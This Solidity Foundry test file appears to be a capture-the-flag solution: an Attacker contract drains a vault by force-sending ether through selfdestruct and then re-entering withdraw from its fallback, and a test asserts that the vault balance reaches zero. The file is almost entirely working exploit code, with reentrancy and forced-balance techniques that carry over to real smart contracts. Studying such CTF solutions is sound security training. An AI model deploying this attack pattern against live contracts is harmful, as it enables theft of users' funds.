// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IVault {
    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256);
    function captureTheFlag(address newFlagHolder) external;
    function flagHolder() external returns (address);
}

contract SelfDestructable {
    constructor() public payable {}
    function destruct(address to) public {
        selfdestruct(payable(to));
    }
}

contract Attacker {
    IVault vault;
    uint cnt = 0;   // Counter to keep track of number of calls for reentrancy

    constructor(address victim) public payable {
        vault = IVault(victim);
    }

    // Fallback function to receive external call from vault contract
    fallback() external payable {
        if (msg.value == 0) {
            cnt += 1;
        }
        if (cnt <= 1) {
            vault.withdraw(0 ether, address(this), address(this));
        }
    }

    function attack(address flagHolder) public {
        // Forcefully transfer 1 ETH to vault by selfdestructing
        SelfDestructable d = new SelfDestructable{value: 1 ether}();
        d.destruct(address(vault));

        // Calling withdraw on vault with assets = 0 and receiver = attackers contract address
        vault.withdraw(0 ether, address(this), address(this));
        require(address(vault).balance == 0, "vault balance is not zero");
        // Capture the flag, at this moment vault balance is zero        
        vault.captureTheFlag(flagHolder);
        console.log("Flag Holder =", vault.flagHolder());
    }
}
contract CTFTest is Test {
    function setUp() public {       
    }

    function testExploit() public {
        // Vault Address
        address victim = 0x8043e6836416d13095567ac645be7C629715885c;
        // Loading vault with 1 ETH
        vm.deal(victim, 1 ether);
        // Attackers EOA Address
        address attacker_eoa = 0xF5BED21BD285CBe352737F686766cCC19BeE7acC;
        // Loading attackers EOA with 1 ETH
        vm.deal(attacker_eoa, 1 ether);
        // All calls will go from attackers EOA
        vm.startPrank(attacker_eoa);
        console.log("Balance before victim:      ", victim.balance);
        console.log("Balance before attacker EOA:", attacker_eoa.balance);
        // Deploying attacker's contract
        Attacker attacker = new Attacker{value: 1 ether}(victim);
        console.log("Balance before attacker:    ", address(attacker).balance);
        
        // Starting the attack
        attacker.attack(attacker_eoa);

        console.log("Balance after victim:      ", victim.balance);
        console.log("Balance after attacker EOA:", attacker_eoa.balance);
        console.log("Balance after attacker:    ", address(attacker).balance);

        // Check to see if attack is successfull
        assertEq(victim.balance, 0);
    }
}
